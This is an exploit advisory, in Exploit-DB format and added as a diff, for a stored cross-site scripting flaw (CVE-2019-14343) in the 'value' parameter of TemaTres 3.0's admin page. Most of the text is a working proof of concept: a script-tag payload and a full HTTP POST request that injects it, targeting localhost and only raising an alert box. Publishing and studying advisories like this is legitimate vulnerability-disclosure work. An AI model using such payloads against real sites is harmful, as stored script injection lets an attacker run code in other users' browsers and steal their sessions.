@@ -1,0 +1,30 @@
+# Exploit Title: TemaTres 3.0 - 'value' Persistent Cross-site Scripting
+# Author: Pablo Santiago
+# Date: 2019-11-14
+# Vendor Homepage: https://www.vocabularyserver.com/
+# Source: https://sourceforge.net/projects/tematres/files/TemaTres%203.0/tematres3.0.zip/download
+# Version: 3.0
+# CVE : 2019–14343
+# Reference: https://medium.com/@Pablo0xSantiago/cve-2019-14343-ebc120800053
+# Tested on: Windows 10
+
+#Description:
+The parameter "value" its vulnerable to Stored Cross-site scripting..
+
+#Payload: “><script>alert(“XSS”)<%2fscript>
+
+POST /tematres3.0/vocab/admin.php?vocabulario_id=list HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0)
+Gecko/20100101 Firefox/66.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/tematres3.0/vocab/admin.php?vocabulario_id=list
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 44
+Connection: close
+Cookie: PHPSESSID=uejtn72aavg5eit9sc9bnr2jse
+Upgrade-Insecure-Requests: 1
+
+doAdmin=&valueid=&value=12vlpcv%22%3e%3cscript%3ealert(%22XSS%22)%3c%2fscript%3edx6e1&alias=ACX&orden=2
